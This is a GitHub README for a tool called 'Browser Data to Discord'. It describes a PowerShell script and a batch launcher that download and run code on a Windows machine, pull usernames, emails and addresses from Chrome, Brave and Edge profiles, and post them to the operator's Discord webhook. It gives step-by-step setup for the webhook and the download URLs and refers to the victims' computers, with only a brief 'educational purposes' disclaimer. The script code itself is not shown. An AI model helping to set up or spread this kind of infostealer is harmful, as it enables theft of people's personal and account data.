
# 🌐 Browser Data to Discord Script

[![GitHub issues](https://img.shields.io/github/issues/pentestfunctions/browserdata_to_discord)](https://github.com/pentestfunctions/browserdata_to_discord/issues)
[![GitHub forks](https://img.shields.io/github/forks/pentestfunctions/browserdata_to_discord)](https://github.com/pentestfunctions/browserdata_to_discord/network)
[![GitHub stars](https://img.shields.io/github/stars/pentestfunctions/browserdata_to_discord)](https://github.com/pentestfunctions/browserdata_to_discord/stargazers)
[![GitHub license](https://img.shields.io/github/license/pentestfunctions/browserdata_to_discord)](https://github.com/pentestfunctions/browserdata_to_discord/blob/main/LICENSE)

This repository contains a PowerShell script (`guesser.ps1`) and a batch file (`file_to_run.bat`) designed to extract browser data (from Chrome, Brave, and Edge) and send it to a Discord webhook.

## 📁 Contents

- `guesser.ps1` - The main PowerShell script.
- `file_to_run.bat` - A batch file for easy execution.

## 📋 Prerequisites

- Windows OS.
- PowerShell.
- Adjusted script execution policies, if necessary.

## 🔧 Setup

### Discord Webhook

1. **Create a Discord Server:**
   - If you don't have one, create a new Discord server.

2. **Set Up a Webhook:**
   - Go to your server settings.
   - Navigate to 'Integrations'.
   - Click on 'New Webhook' or edit an existing one.
   - Name your webhook and select the channel you want the data to be posted in.
   - Copy the webhook URL.

### Repository Setup

1. **Fork the Repository:**
   - Fork this repository to your GitHub account.

2. **Update the Webhook URL:**
   - Clone your forked repository.
   - Edit `guesser.ps1` to replace the `$WEBHOOK_URL` with your Discord webhook URL.
   - Then you will also need to update the DOWNLOAD_URL in the PS1 file on your github as well as the PS1 file location in the file_to_execute.bat file

## 🚀 Usage

1. **Download `file_to_run.bat` from your forked repository.**
2. **Run `file_to_run.bat`** - This will automatically download and run `guesser.ps1`.
3. When you run the batch file on a windows machine, it will download the powershell file and execute it.
4. The powershell file will also download a copy of `DB Browser for SQLite` to extract usernames, emails, addresses from the browsers installed on their computer and user profiles.
5. The data will then be sent to your discord webhook.

## 📖 How It Works

- `file_to_run.bat` automates the script's download and execution.
- `guesser.ps1` extracts data from the specified browsers and posts it to the Discord webhook.

## ⚠️ Disclaimer

This script is for educational purposes only. Use it on systems and data you're authorized to access. Unauthorized use is illegal and strictly prohibited.

## 👥 Contribution

Contributions are welcome. Fork, modify, and create a pull request with your enhancements.

## 📜 License

[Your License Here]
